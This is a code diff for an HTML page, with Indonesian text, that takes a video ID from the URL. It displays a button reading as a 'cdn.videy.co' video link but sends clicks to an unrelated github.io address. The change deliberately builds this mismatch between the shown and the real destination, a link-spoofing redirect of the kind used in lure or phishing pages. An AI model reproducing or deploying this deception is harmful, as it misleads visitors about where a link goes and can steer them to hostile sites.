@@ -43,23 +43,26 @@
   </style>
 </head>
 <body>
-  <div id="container">
-    <span id="btn">▶ https://cdn.videy.co/idunik.mp4</span>
-  </div>
+  <div id="container"></div>
 
   <script>
     var BASE = "https://inpodong00.github.io/x3/";
+    var DISPLAY_BASE = "https://cdn.videy.co/";
 
     var params = new URLSearchParams(window.location.search);
     var v = params.get("v") || params.get("id");
     var container = document.getElementById("container");
-    var btn = document.getElementById("btn");
 
     if (v && /^[A-Za-z0-9._-]{1,100}$/.test(v)) {
       var target = BASE + "?v=" + encodeURIComponent(v);
+
+      var btn = document.createElement("span");
+      btn.id = "btn";
+      btn.textContent = "▶ " + DISPLAY_BASE + v;
       btn.addEventListener("click", function () {
         window.location.href = target;
       });
+      container.appendChild(btn);
     } else {
       container.innerHTML = '<p id="err">Parameter tidak ditemukan atau tidak valid. Contoh: ?v=idunik.mp4</p>';
     }
